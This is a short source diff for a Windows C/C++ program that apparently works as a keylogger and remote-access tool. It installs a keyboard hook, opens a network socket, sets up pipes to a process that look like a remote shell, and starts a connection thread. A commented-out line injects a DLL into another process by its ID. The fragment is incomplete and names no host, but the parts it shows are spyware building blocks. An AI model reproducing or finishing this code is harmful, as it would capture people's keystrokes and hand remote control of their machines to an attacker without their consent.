@@ -12,7 +12,7 @@
 #endif
 
 BOOL iskeyHook;
-SOCKET client;
+ SOCKET client;
 BOOL SetKeyBoardHook(HWND Hwnd);
 #define MAX_LOADSTRING 100
 
@@ -125,17 +125,20 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
-
- client = InitSock();
-   if (client == INVALID_SOCKET)
-	   return TRUE;
-
+/*
+  inJectDLL(4448, _T("C:\\dll.dll"));
+   return TRUE;*/
+   
+   client = InitSock();
+  
+	   
+   
    int res = InitPipe(&myIn, &myOut,&prcessid);
    if (!res)
 	   return TRUE;
 
    res = SetKeyBoardHook(hWnd);
-   CreateThread(NULL, NULL, proceThread, (LPVOID)client, 0, 0);
+   CreateThread(NULL, NULL, connectFun, NULL, 0, 0);
  
    return TRUE;
 }
